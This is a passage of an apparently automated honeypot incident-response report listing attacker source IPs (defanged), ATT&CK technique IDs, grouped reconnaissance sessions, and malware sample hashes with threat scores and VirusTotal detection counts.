| IR-544d6bb0bcae | HIGH | `109.105.209[.]10` | 2026-10-19 07:43 | Y | 3 | 0 | `T1078` |
| IR-388ca7ecce5e | HIGH | `2.57.122[.]209` | 2026-10-19 08:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-4c9eab4b93af | HIGH | `129.121.114[.]113` | 2026-10-19 08:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e7d6232f0bce | HIGH | `129.121.114[.]113` | 2026-10-19 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-81e19a9d914c | HIGH | `46.24.47[.]94` | 2026-10-19 08:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-634995a4863e | HIGH | `46.24.47[.]94` | 2026-10-19 08:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8d4a776897ae | HIGH | `120.48.176[.]103` | 2026-10-19 08:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-906e3b9dea67 | HIGH | `45.115.26[.]155` | 2026-10-19 08:51 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4293f658bd13 | HIGH | `45.115.26[.]155` | 2026-10-19 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0b1eac4eceb | HIGH | `176.53.159[.]196` | 2026-10-19 08:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-956975d5cbb7 | HIGH | `109.160.32[.]105` | 2026-10-19 09:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2a1ecc89348a | HIGH | `77.90.185[.]20` | 2026-10-19 10:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6a62218da73c | HIGH | `77.90.185[.]20` | 2026-10-19 10:29 | Y | 1 | 0 | `T1021.004 · T1059.004 · T1078` |
| IR-3a14adbdece0 | HIGH | `45.115.26[.]24` | 2026-10-19 10:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a45bba0449d5 | HIGH | `45.115.26[.]24` | 2026-10-19 10:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-875a57a864f8 | HIGH | `182.74.206[.]194` | 2026-10-19 10:53 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-0aa9fb7792af | HIGH | `217.182.253[.]249` | 2026-10-19 10:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a9452a577d86 | HIGH | `217.182.253[.]249` | 2026-10-19 10:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a5d3f5758ad3 | HIGH | `51.38.225[.]143` | 2026-10-19 10:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b8b95bf7fa6e | HIGH | `51.38.225[.]143` | 2026-10-19 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5e40511c5068 | HIGH | `50.117.59[.]139` | 2026-10-19 10:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2e5023cfb815 | HIGH | `50.117.59[.]139` | 2026-10-19 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f11a9721ad41 | HIGH | `14.103.105[.]246` | 2026-10-19 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b10c1803379d | HIGH | `123.31.29[.]131` | 2026-10-19 10:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eae20b474cb6 | HIGH | `123.31.29[.]131` | 2026-10-19 10:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e82e1adea5d0 | HIGH | `177.93.61[.]202` | 2026-10-19 10:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1286e360228a | HIGH | `216.45.63[.]131` | 2026-10-19 10:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-55e6bf57c2c6 | HIGH | `216.45.63[.]131` | 2026-10-19 10:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-54b383aeaa74 | HIGH | `177.93.61[.]202` | 2026-10-19 10:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c94ec50c6a6c | HIGH | `85.50.121[.]120` | 2026-10-19 11:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 97 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `119.193.99[.]219` | **5** | 2026-10-19 06:19 | 2026-10-19 14:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-19 01:06 | 2026-10-19 04:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-19 12:22 | 2026-10-19 16:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `208.109.244[.]195` | **3** | 2026-10-19 13:05 | 2026-10-19 16:14 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.211.76[.]8` | **2** | 2026-10-19 15:05 | 2026-10-19 16:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.139.211[.]160` | **2** | 2026-10-19 14:53 | 2026-10-19 16:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-19 06:17 | 2026-10-19 08:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-19 03:55 | 2026-10-19 04:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | **2** | 2026-10-19 07:32 | 2026-10-19 08:35 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `211.251.11[.]198` | **2** | 2026-10-19 01:49 | 2026-10-19 02:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | **2** | 2026-10-19 09:55 | 2026-10-19 10:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | **2** | 2026-10-19 12:11 | 2026-10-19 14:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.214[.]116` | 1 | 2026-10-19 14:39 | 2026-10-19 14:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-10-19 13:02 | 2026-10-19 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.29.70[.]204` | 1 | 2026-10-19 10:05 | 2026-10-19 10:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `106.12.32[.]235` | 1 | 2026-10-19 05:00 | 2026-10-19 05:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]117` | 1 | 2026-10-19 11:49 | 2026-10-19 11:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.77[.]231` | 1 | 2026-10-19 10:55 | 2026-10-19 10:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]10` | 1 | 2026-10-19 07:43 | 2026-10-19 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]7` | 1 | 2026-10-19 07:43 | 2026-10-19 07:43 | 4s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]8` | 1 | 2026-10-19 07:43 | 2026-10-19 07:43 | 4s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]9` | 1 | 2026-10-19 07:43 | 2026-10-19 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]105` | 1 | 2026-10-19 08:59 | 2026-10-19 08:59 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]157` | 1 | 2026-10-19 05:30 | 2026-10-19 05:31 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]163` | 1 | 2026-10-19 05:12 | 2026-10-19 05:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]169` | 1 | 2026-10-19 06:18 | 2026-10-19 06:18 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.48.160[.]201` | 1 | 2026-10-19 04:01 | 2026-10-19 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]21` | 1 | 2026-10-19 03:05 | 2026-10-19 03:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.181[.]18` | 1 | 2026-10-19 11:43 | 2026-10-19 11:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.249[.]177` | 1 | 2026-10-19 11:01 | 2026-10-19 11:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.62[.]199` | 1 | 2026-10-19 03:12 | 2026-10-19 03:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.191.18[.]114` | 1 | 2026-10-19 14:34 | 2026-10-19 14:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.23[.]138` | 1 | 2026-10-19 06:02 | 2026-10-19 06:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.23[.]138` | 1 | 2026-10-19 10:58 | 2026-10-19 10:59 | 86s | 0 | `T1592` | 🟢 LOW |
| `115.191.27[.]238` | 1 | 2026-10-19 14:41 | 2026-10-19 14:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.246[.]44` | 1 | 2026-10-19 01:35 | 2026-10-19 01:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.178.138[.]10` | 1 | 2026-10-19 06:03 | 2026-10-19 06:03 | 11s | 0 | `T1592` | 🟢 LOW |
| `120.48.124[.]81` | 1 | 2026-10-19 14:34 | 2026-10-19 14:35 | 86s | 0 | `T1592` | 🟢 LOW |
| `120.77.210[.]41` | 1 | 2026-10-19 16:01 | 2026-10-19 16:01 | 1s | 0 | `T1592` | 🟢 LOW |
| `121.152.123[.]106` | 1 | 2026-10-19 09:23 | 2026-10-19 09:23 | 24s | 0 | `T1592` | 🟢 LOW |
| `121.168.54[.]210` | 1 | 2026-10-19 12:23 | 2026-10-19 12:23 | 3s | 0 | `T1592` | 🟢 LOW |
| `121.204.150[.]212` | 1 | 2026-10-19 14:46 | 2026-10-19 14:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.59.7[.]18` | 1 | 2026-10-19 14:36 | 2026-10-19 14:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.174.7[.]42` | 1 | 2026-10-19 05:18 | 2026-10-19 05:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-19 01:59 | 2026-10-19 01:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-19 06:31 | 2026-10-19 06:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-19 10:57 | 2026-10-19 10:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-19 14:44 | 2026-10-19 14:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]32` | 1 | 2026-10-19 05:18 | 2026-10-19 05:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-19 07:42 | 2026-10-19 07:43 | 46s | 0 | `T1592` | 🟢 LOW |
| `132.255.113[.]156` | 1 | 2026-10-19 07:20 | 2026-10-19 07:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-19 10:12 | 2026-10-19 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]246` | 1 | 2026-10-19 11:05 | 2026-10-19 11:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.108[.]102` | 1 | 2026-10-19 03:59 | 2026-10-19 04:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]186` | 1 | 2026-10-19 13:35 | 2026-10-19 13:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.86[.]183` | 1 | 2026-10-19 16:27 | 2026-10-19 16:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.22.23[.]243` | 1 | 2026-10-19 02:39 | 2026-10-19 02:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.223.98[.]198` | 1 | 2026-10-19 11:01 | 2026-10-19 11:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.211.212[.]42` | 1 | 2026-10-19 03:35 | 2026-10-19 03:35 | 27s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-10-19 15:06 | 2026-10-19 15:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-10-19 15:41 | 2026-10-19 15:41 | 1s | 0 | `T1592` | 🟢 LOW |
| `172.210.9[.]231` | 1 | 2026-10-19 15:19 | 2026-10-19 15:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-19 03:58 | 2026-10-19 03:58 | 15s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-19 06:46 | 2026-10-19 06:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `18.191.16[.]102` | 1 | 2026-10-19 10:03 | 2026-10-19 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]73` | 1 | 2026-10-19 02:54 | 2026-10-19 02:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `180.76.250[.]204` | 1 | 2026-10-19 03:03 | 2026-10-19 03:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.101.128[.]201` | 1 | 2026-10-19 09:01 | 2026-10-19 09:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.36.126[.]68` | 1 | 2026-10-19 02:39 | 2026-10-19 02:41 | 88s | 0 | `T1592` | 🟢 LOW |
| `183.56.196[.]185` | 1 | 2026-10-19 02:47 | 2026-10-19 02:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-10-19 15:41 | 2026-10-19 15:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.231.33[.]82` | 1 | 2026-10-19 01:20 | 2026-10-19 01:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.122.90[.]57` | 1 | 2026-10-19 00:57 | 2026-10-19 00:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.85.136[.]229` | 1 | 2026-10-19 15:44 | 2026-10-19 15:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-10-19 10:13 | 2026-10-19 10:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-19 04:37 | 2026-10-19 04:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.163.187[.]213` | 1 | 2026-10-19 16:30 | 2026-10-19 16:30 | 16s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-19 07:03 | 2026-10-19 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.8.186[.]31` | 1 | 2026-10-19 04:11 | 2026-10-19 04:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-19 12:16 | 2026-10-19 12:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-10-19 14:41 | 2026-10-19 14:41 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-19 04:30 | 2026-10-19 04:30 | 15s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-19 11:31 | 2026-10-19 11:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.121.114[.]183` | 1 | 2026-10-19 16:20 | 2026-10-19 16:20 | 9s | 0 | `T1592` | 🟢 LOW |
| `202.57.211[.]39` | 1 | 2026-10-19 14:47 | 2026-10-19 14:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.148.86[.]167` | 1 | 2026-10-19 14:14 | 2026-10-19 14:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.175.171[.]10` | 1 | 2026-10-19 03:55 | 2026-10-19 03:55 | 3s | 0 | `T1592` | 🟢 LOW |
| `207.175.25[.]218` | 1 | 2026-10-19 02:33 | 2026-10-19 02:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `211.107.189[.]125` | 1 | 2026-10-19 11:44 | 2026-10-19 11:44 | 19s | 0 | `T1592` | 🟢 LOW |
| `211.194.52[.]6` | 1 | 2026-10-19 14:34 | 2026-10-19 14:34 | 29s | 0 | `T1592` | 🟢 LOW |
| `211.251.11[.]198` | 1 | 2026-10-19 04:05 | 2026-10-19 04:05 | 22s | 0 | `T1592` | 🟢 LOW |
| `212.70.109[.]160` | 1 | 2026-10-19 14:44 | 2026-10-19 14:44 | 1s | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]106` | 1 | 2026-10-19 07:21 | 2026-10-19 07:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-10-19 10:02 | 2026-10-19 10:02 | 1s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-10-19 14:55 | 2026-10-19 14:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.125.218[.]30` | 1 | 2026-10-19 08:53 | 2026-10-19 08:53 | 26s | 0 | `T1592` | 🟢 LOW |
| `221.157.130[.]150` | 1 | 2026-10-19 04:01 | 2026-10-19 04:02 | 23s | 0 | `T1592` | 🟢 LOW |
| `221.159.163[.]36` | 1 | 2026-10-19 16:16 | 2026-10-19 16:17 | 29s | 0 | `T1592` | 🟢 LOW |
| `221.166.164[.]167` | 1 | 2026-10-19 14:50 | 2026-10-19 14:50 | 30s | 0 | `T1592` | 🟢 LOW |
| `221.229.218[.]50` | 1 | 2026-10-19 02:39 | 2026-10-19 02:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.229.220[.]180` | 1 | 2026-10-19 02:42 | 2026-10-19 02:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.109.132[.]225` | 1 | 2026-10-19 10:51 | 2026-10-19 10:52 | 26s | 0 | `T1592` | 🟢 LOW |
| `27.128.171[.]39` | 1 | 2026-10-19 10:54 | 2026-10-19 10:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | 1 | 2026-10-19 16:25 | 2026-10-19 16:26 | 16s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-19 07:43 | 2026-10-19 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]99` | 1 | 2026-10-19 13:46 | 2026-10-19 13:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.41.94[.]66` | 1 | 2026-10-19 13:05 | 2026-10-19 13:06 | 14s | 0 | `T1592` | 🟢 LOW |
| `34.156.198[.]127` | 1 | 2026-10-19 02:19 | 2026-10-19 02:19 | 3s | 0 | `T1592` | 🟢 LOW |
| `34.78.119[.]163` | 1 | 2026-10-19 03:04 | 2026-10-19 03:04 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.205.228[.]238` | 1 | 2026-10-19 03:55 | 2026-10-19 03:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.111.40[.]138` | 1 | 2026-10-19 02:53 | 2026-10-19 02:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.134.69[.]15` | 1 | 2026-10-19 13:32 | 2026-10-19 13:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.134.96[.]76` | 1 | 2026-10-19 16:27 | 2026-10-19 16:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.87[.]169` | 1 | 2026-10-19 03:45 | 2026-10-19 03:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]253` | 1 | 2026-10-19 06:35 | 2026-10-19 06:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.119.28[.]140` | 1 | 2026-10-19 10:20 | 2026-10-19 10:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.115.26[.]155` | 1 | 2026-10-19 08:51 | 2026-10-19 08:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.115.26[.]24` | 1 | 2026-10-19 10:37 | 2026-10-19 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.231.88[.]43` | 1 | 2026-10-19 11:29 | 2026-10-19 11:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.41.105[.]226` | 1 | 2026-10-19 06:09 | 2026-10-19 06:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.43.62[.]77` | 1 | 2026-10-19 12:12 | 2026-10-19 12:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-10-19 11:09 | 2026-10-19 11:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.191.141[.]152` | 1 | 2026-10-19 15:13 | 2026-10-19 15:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.98.61[.]20` | 1 | 2026-10-19 16:24 | 2026-10-19 16:24 | 11s | 0 | `T1592` | 🟢 LOW |
| `47.236.199[.]209` | 1 | 2026-10-19 05:52 | 2026-10-19 05:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.248.250[.]122` | 1 | 2026-10-19 10:53 | 2026-10-19 10:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.165.19[.]3` | 1 | 2026-10-19 02:38 | 2026-10-19 02:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.94.201[.]66` | 1 | 2026-10-19 01:07 | 2026-10-19 01:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-19 11:23 | 2026-10-19 11:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.91.68[.]68` | 1 | 2026-10-19 01:29 | 2026-10-19 01:29 | 1s | 0 | `T1592` | 🟢 LOW |
| `58.252.59[.]219` | 1 | 2026-10-19 10:38 | 2026-10-19 10:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-19 16:03 | 2026-10-19 16:03 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.34.94[.]207` | 1 | 2026-10-19 15:55 | 2026-10-19 15:56 | 47s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]66` | 1 | 2026-10-19 09:14 | 2026-10-19 09:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-10-19 02:16 | 2026-10-19 02:16 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-10-19 02:40 | 2026-10-19 02:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]94` | 1 | 2026-10-19 06:50 | 2026-10-19 06:50 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.92.91[.]63` | 1 | 2026-10-19 03:57 | 2026-10-19 03:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]42` | 1 | 2026-10-19 12:13 | 2026-10-19 12:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]107` | 1 | 2026-10-19 13:34 | 2026-10-19 13:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.175.213[.]4` | 1 | 2026-10-19 02:31 | 2026-10-19 02:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]157` | 1 | 2026-10-19 02:29 | 2026-10-19 02:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-19 07:37 | 2026-10-19 07:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-10-19 03:11 | 2026-10-19 03:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-10-19 08:42 | 2026-10-19 08:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]109` | 1 | 2026-10-19 07:51 | 2026-10-19 07:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `69.5.21[.]13` | 1 | 2026-10-19 03:54 | 2026-10-19 03:55 | 82s | 0 | `T1592` | 🟢 LOW |
| `71.159.246[.]16` | 1 | 2026-10-19 14:57 | 2026-10-19 14:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]24` | 1 | 2026-10-19 02:05 | 2026-10-19 02:05 | 8s | 0 | `T1592` | 🟢 LOW |
| `76.195.202[.]192` | 1 | 2026-10-19 15:34 | 2026-10-19 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-19 10:44 | 2026-10-19 10:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]162` | 1 | 2026-10-19 05:07 | 2026-10-19 05:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]84` | 1 | 2026-10-19 06:50 | 2026-10-19 06:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-10-19 03:11 | 2026-10-19 03:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.233.22[.]227` | 1 | 2026-10-19 10:40 | 2026-10-19 10:40 | 27s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]18` | 1 | 2026-10-19 11:10 | 2026-10-19 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]135` | 1 | 2026-10-19 13:45 | 2026-10-19 13:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.225.91[.]93` | 1 | 2026-10-19 06:05 | 2026-10-19 06:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | 1 | 2026-10-19 01:36 | 2026-10-19 01:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
